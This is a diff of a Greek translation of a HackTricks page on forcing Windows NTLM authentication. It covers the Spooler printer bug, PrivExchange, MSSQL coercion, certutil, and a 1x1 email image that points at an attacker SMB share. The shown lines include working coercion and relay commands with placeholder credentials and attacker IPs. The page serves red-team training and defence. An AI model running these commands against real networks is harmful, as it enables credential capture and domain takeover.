@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" d
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **απομακρυσμένα triggers αυθεντικοποίησης** κωδικοποιημένα σε C# χρησιμοποιώντας τον μεταγλωττιστή MIDL για να αποφευχθούν οι εξαρτήσεις από τρίτους.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **απομακρυσμένα triggers αυθεντικοποίησης** κωδικοποιημένα σε C# χρησιμοποιώντας τον μεταγλωττιστή MIDL για την αποφυγή εξαρτήσεων από τρίτους.
 
 ## Κατάχρηση Υπηρεσίας Spooler
 
@@ -47,24 +47,24 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-ή χρησιμοποιήστε το [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν είστε σε Linux
+ή χρησιμοποιήστε [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν είστε σε Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Συνδυασμός με Απεριόριστη Αντιπροσώπευση
 
-Εάν ένας επιτιθέμενος έχει ήδη παραβιάσει έναν υπολογιστή με [Απεριόριστη Αντιπροσώπευση](unconstrained-delegation.md), ο επιτιθέμενος θα μπορούσε **να κάνει τον εκτυπωτή να πιστοποιηθεί σε αυτόν τον υπολογιστή**. Λόγω της απεριόριστης αντιπροσώπευσης, το **TGT** του **λογαριασμού υπολογιστή του εκτυπωτή** θα **αποθηκευτεί** στη **μνήμη** του υπολογιστή με απεριόριστη αντιπροσώπευση. Καθώς ο επιτιθέμενος έχει ήδη παραβιάσει αυτήν τη συσκευή, θα είναι σε θέση να **ανακτήσει αυτό το εισιτήριο** και να το εκμεταλλευτεί ([Pass the Ticket](pass-the-ticket.md)).
+Εάν ένας επιτιθέμενος έχει ήδη παραβιάσει έναν υπολογιστή με [Απεριόριστη Αντιπροσώπευση](unconstrained-delegation.md), ο επιτιθέμενος θα μπορούσε **να κάνει τον εκτυπωτή να πιστοποιηθεί σε αυτόν τον υπολογιστή**. Λόγω της απεριόριστης αντιπροσώπευσης, το **TGT** του **λογαριασμού υπολογιστή του εκτυπωτή** θα είναι **αποθηκευμένο** στη **μνήμη** του υπολογιστή με απεριόριστη αντιπροσώπευση. Καθώς ο επιτιθέμενος έχει ήδη παραβιάσει αυτήν την υποδοχή, θα είναι σε θέση να **ανακτήσει αυτό το εισιτήριο** και να το εκμεταλλευτεί ([Pass the Ticket](pass-the-ticket.md)).
 
-## RCP Force authentication
+## RCP Ανάγκη πιστοποίησης
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός σφάλματος που βρέθηκε στη **λειτουργία `PushSubscription` του Exchange Server**. Αυτή η λειτουργία επιτρέπει στον διακομιστή Exchange να αναγκάζεται από οποιονδήποτε χρήστη τομέα με γραμματοκιβώτιο να πιστοποιείται σε οποιονδήποτε πελάτη που παρέχει έναν διακομιστή μέσω HTTP.
+Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός σφάλματος που βρέθηκε στη **λειτουργία `PushSubscription` του Exchange Server**. Αυτή η λειτουργία επιτρέπει στον διακομιστή Exchange να αναγκάζεται από οποιονδήποτε χρήστη τομέα με γραμματοκιβώτιο να πιστοποιείται σε οποιονδήποτε πελάτη που παρέχει υποδοχή μέσω HTTP.
 
-Από προεπιλογή, η **υπηρεσία Exchange εκτελείται ως SYSTEM** και της παρέχονται υπερβολικά δικαιώματα (συγκεκριμένα, έχει **WriteDacl δικαιώματα στον τομέα πριν από την ενημέρωση Cumulative Update 2019**). Αυτό το σφάλμα μπορεί να εκμεταλλευτεί για να επιτρέψει την **αναμετάδοση πληροφοριών σε LDAP και στη συνέχεια να εξαγάγει τη βάση δεδομένων NTDS του τομέα**. Σε περιπτώσεις όπου η αναμετάδοση σε LDAP δεν είναι δυνατή, αυτό το σφάλμα μπορεί να χρησιμοποιηθεί για να αναμεταδώσει και να πιστοποιηθεί σε άλλους διακομιστές εντός του τομέα. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Διαχειριστή Τομέα με οποιονδήποτε πιστοποιημένο λογαριασμό χρήστη τομέα.
+Από προεπιλογή, η **υπηρεσία Exchange εκτελείται ως SYSTEM** και της έχουν δοθεί υπερβολικά δικαιώματα (συγκεκριμένα, έχει **WriteDacl δικαιώματα στον τομέα πριν από την ενημέρωση Cumulative Update 2019**). Αυτό το σφάλμα μπορεί να εκμεταλλευτεί για να επιτρέψει την **αναμετάδοση πληροφοριών σε LDAP και στη συνέχεια να εξαγάγει τη βάση δεδομένων NTDS του τομέα**. Σε περιπτώσεις όπου η αναμετάδοση σε LDAP δεν είναι δυνατή, αυτό το σφάλμα μπορεί να χρησιμοποιηθεί για να αναμεταδώσει και να πιστοποιηθεί σε άλλες υποδοχές εντός του τομέα. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Διαχειριστή Τομέα με οποιονδήποτε πιστοποιημένο λογαριασμό χρήστη τομέα.
 
 ## Μέσα στα Windows
 
@@ -89,11 +89,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Ή χρησιμοποιήστε αυτήν την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-Είναι δυνατόν να χρησιμοποιήσετε το certutil.exe lolbin (υπογεγραμμένο δυαδικό αρχείο της Microsoft) για να εξαναγκάσετε την αυθεντικοποίηση NTLM:
+Είναι δυνατόν να χρησιμοποιήσετε το certutil.exe lolbin (υπογεγραμμένο από τη Microsoft δυαδικό) για να εξαναγκάσετε την αυθεντικοποίηση NTLM:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -101,8 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as  
-αν θέλετε να εκμεταλλευτείτε την ευπάθεια.
+Αν γνωρίζετε τη **διεύθυνση email** του χρήστη που συνδέεται σε μια μηχανή που θέλετε να παραβιάσετε, μπορείτε απλά να του στείλετε ένα **email με μια εικόνα 1x1** όπως
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -117,7 +116,7 @@ If you know the **email address** of the user that logs inside a machine you wan
 ## Cracking NTLMv1
 
 Αν μπορείτε να συλλάβετε [NTLMv1 challenges διαβάστε εδώ πώς να τα σπάσετε](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;ε θυμάστε ότι για να σπάσετε το NTLMv1 πρέπει να ορίσετε την πρόκληση Responder σε "1122334455667788"_
+&#xNAN;_&#x52;emember ότι για να σπάσετε το NTLMv1 πρέπει να ορίσετε την πρόκληση του Responder σε "1122334455667788"_
 
 {% hint style="success" %}
 Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
